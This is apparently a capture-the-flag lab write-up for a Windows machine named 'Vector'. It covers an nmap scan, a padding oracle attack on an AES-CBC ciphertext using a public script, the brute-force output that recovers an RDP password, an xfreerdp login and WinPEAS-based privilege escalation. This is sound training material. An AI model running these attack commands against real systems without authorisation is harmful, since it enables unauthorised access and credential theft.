# Vector

## Gaining Access

Nmap scan:

```
$ nmap -p- --min-rate 4000 192.168.233.119
Starting Nmap 7.93 ( https://nmap.org ) at 2023-06-30 17:12 +08
Nmap scan report for 192.168.233.119
Host is up (0.17s latency).
Not shown: 65528 filtered tcp ports (no-response)
PORT     STATE SERVICE
21/tcp   open  ftp
80/tcp   open  http
135/tcp  open  msrpc
139/tcp  open  netbios-ssn
445/tcp  open  microsoft-ds
2290/tcp open  sonus-logging
3389/tcp open  ms-wbt-server
5985/tcp open  wsman
```

### Web Enum

Port 80 reveals a basic login page:

<figure><img src="../../../.gitbook/assets/image (1291).png" alt=""><figcaption></figcaption></figure>

Port 2290 was also a HTTP port, and it returned something simple:

<figure><img src="../../../.gitbook/assets/image (1400).png" alt=""><figcaption></figcaption></figure>

C? When we view the page source, there's also this part here:

```markup
</div>
	<span id="MyLabel">ERROR: missing parameter "<b>c</b>"</span>
	<!--
		AES-256-CBC-PKCS7 ciphertext: 4358b2f77165b5130e323f067ab6c8a92312420765204ce350b1fbb826c59488
		
		Victor's TODO: Need to add authentication eventually..
	->
</form>
```

There's a commented ciphertext, and there's also something which takes a parameter. We can try putting this ciphertext as the parameter requested.&#x20;

<figure><img src="../../../.gitbook/assets/image (1004).png" alt=""><figcaption></figcaption></figure>

If we remove some characters, then it loads something else.

<figure><img src="../../../.gitbook/assets/image (2893).png" alt=""><figcaption></figcaption></figure>

That's literally all of the enumeration that is possible to do.

### Paddling Oracle Attack -> RDP&#x20;

The first thing we can note is the AES mode used, which is CBC. This mode is insecure against a paddle oracle attack. For this application, it appears that when a parameter `c` (short for ciphertext) is submitted, we get a '1' if it has valid padding, else we get a '0'. This explains why the ciphertext, when submitted returns a '1'. This confirms that we need to use this attack to get the ciphertext out.&#x20;

Here's a full video explaining the paddle oracle attack (which I needed to know for my exam lol):

{% embed url="https://www.youtube.com/watch?v=4EgD4PEatA8" %}

Of course, to exploit this we will leverage on automated methods since it involves brute forcing each byte of the ciphertext. Tools like `padbuster` also work if configured properly, but I opted to use the script from this repo since it was easier to configure:

{% embed url="https://github.com/mpgn/Padding-oracle-attack" %}

{% code overflow="wrap" %}
```bash
$ python3 exploit.py -c 4358b2f77165b5130e323f067ab6c8a92312420765204ce350b1fbb826c59488 -l 16 --host 192.168.233.119:2290 -u /?c= --error '<span id="MyLabel">0</span>' --method GET
```
{% endcode %}

This would brute force every single character out. Here's the output of it:

```
[+] Search value block :  1 

[+] Found 1 bytes : 04

[+] Found 2 bytes : 0404

[+] Found 3 bytes : 040404

[+] Found 4 bytes : 04040404

[+] Found 5 bytes : 3704040404

[+] Found 6 bytes : 743704040404

[+] Found 7 bytes : 61743704040404

[+] Found 8 bytes : 5661743704040404

[+] Found 9 bytes : 655661743704040404

[+] Found 10 bytes : 6f655661743704040404

[+] Found 11 bytes : 6c6f655661743704040404

[+] Found 12 bytes : 416c6f655661743704040404

[+] Found 13 bytes : 6d416c6f655661743704040404

[+] Found 14 bytes : 726d416c6f655661743704040404

[+] Found 15 bytes : 6f726d416c6f655661743704040404

[+] Found 16 bytes : 576f726d416c6f655661743704040404


[+] Decrypted value (HEX): 576F726D416C6F655661743704040404
[+] Decrypted value (ASCII): WormAloeVat7
```

We get a password! SSH is not open on the machine, but RDP is. `xfreerdp` can be used to connect to it.&#x20;

```
$ xfreerdp /u:victor /p:WormAloeVat7 /v:192.168.233.119
```

<figure><img src="../../../.gitbook/assets/image (1952).png" alt=""><figcaption></figcaption></figure>

We can then grab the user flag.

## Privilege Escalation

### WinPEAS -> Admin Shell

I downloaded and ran `winPEASx64.exe` on the machine, and found this output:

<figure><img src="../../../.gitbook/assets/image (1778).png" alt=""><figcaption></figcaption></figure>

It's pretty trivial to get an administrator shell from this.&#x20;

<figure><img src="../../../.gitbook/assets/image (1278).png" alt=""><figcaption></figcaption></figure>

Rooted!
